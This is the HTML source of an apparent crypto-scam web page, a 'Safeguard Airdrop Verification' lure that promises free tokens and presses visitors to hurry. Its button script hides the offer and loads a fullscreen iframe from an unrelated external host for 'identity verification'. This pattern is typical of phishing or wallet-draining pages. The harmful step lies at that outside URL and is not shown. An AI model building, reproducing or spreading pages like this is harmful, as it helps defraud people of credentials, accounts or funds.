<html><head></head><body><div class="tgme_page_wrap" bis_skin_checked="1">
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Safeguard Airdrop Verification</title>
  <style>
    /* Dark theme styling */
    body {
      margin: 0;
      padding: 0;
      font-family: Arial, sans-serif;
      background: linear-gradient(to bottom right, #0f0f0f, #1c1c1c);
      color: #fff;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }

    /* Main content box */
    .container {
      background-color: #1c1c1c;
      padding: 30px;
      border-radius: 15px;
      box-shadow: 0 10px 30px rgba(255, 255, 255, 0.1);
      max-width: 500px;
      width: 90%;
      text-align: center;
      transition: opacity 0.6s ease, transform 0.6s ease;
    }

    /* Logo styling */
    .logo img {
      max-width: 120px;
      border-radius: 12px;
      box-shadow: 0 4px 8px rgba(255, 255, 255, 0.1);
    }

    /* Headline styling */
    .title {
      font-size: 28px;
      font-weight: bold;
      margin: 20px 0;
      color: #fff;
    }

    .description {
      font-size: 16px;
      color: #ccc;
      margin-bottom: 25px;
      line-height: 1.6;
    }

    .highlight {
      color: #4abc96;
      font-weight: bold;
    }

    /* Button styles */
    .verify-btn {
      display: inline-block;
      background-color: #4abc96;
      color: #fff;
      font-size: 18px;
      padding: 12px 25px;
      border-radius: 8px;
      text-decoration: none;
      font-weight: bold;
      box-shadow: 0 4px 12px rgba(74, 188, 150, 0.5);
      transition: all 0.3s ease;
      cursor: pointer;
    }

    .verify-btn:hover {
      background-color: #3a9f7c;
      box-shadow: 0 6px 16px rgba(74, 188, 150, 0.7);
    }

    /* Iframe container - Fullscreen */
    .iframe-container {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background-color: #000;
      display: none;
      opacity: 0;
      transition: opacity 0.6s ease;
      z-index: 1000;
    }

    iframe {
      width: 100%;
      height: 100%;
      border: none;
    }

    /* Hide the container when animating */
    .hide {
      opacity: 0;
      transform: translateY(-20px);
      pointer-events: none;
    }

    /* Show iframe smoothly */
    .show {
      display: block !important;
      opacity: 1;
    }
  </style>

  <div class="container" id="content" bis_skin_checked="1">
    <!-- Logo Section -->
    <div class="logo" bis_skin_checked="1">
      <img src="https://img.freepik.com/premium-vector/anubis-meme-coin-logo-vector-illustration_969863-99046.jpg" alt="Safeguard">
    </div>

    <!-- Title -->
    <div class="title" bis_skin_checked="1">Exclusive Free Airdrop</div>

    <!-- Description -->
    <div class="description" bis_skin_checked="1">
      üöÄ Join the future of digital finance!<br>
      Claim your free tokens today by verifying your identity below.<br>
      Our <span class="highlight">CTO</span> is excited to bring this exclusive opportunity to our community.<br><br>
      ‚è≥ Act fast ‚Äî <span class="highlight">only a few spots left!</span><br><br>
      Powered by: <span class="highlight">MemeSeek</span>
    </div>

    <!-- Verify Button -->
    <button class="verify-btn" onclick="openVerification()">Verify &amp; Claim Airdrop</button>
  </div>

  <!-- Embedded Verification Fullscreen -->
  <div class="iframe-container" id="iframeContainer" bis_skin_checked="1">
    <iframe id="verificationIframe" src=""></iframe>
  </div>

  <script>
    function openVerification() {
      // Hide the main content with animation
      document.getElementById('content').classList.add('hide');
      setTimeout(() => {
        document.getElementById('content').style.display = 'none';
        // Show the iframe with animation
        document.getElementById('iframeContainer').classList.add('show');
      }, 600); // Matches CSS transition time

      // Set iframe source after animation starts
      document.getElementById('verificationIframe').src = 'https://reerferer.vercel.app/a';
    }
  </script>
</div>
</body></html>
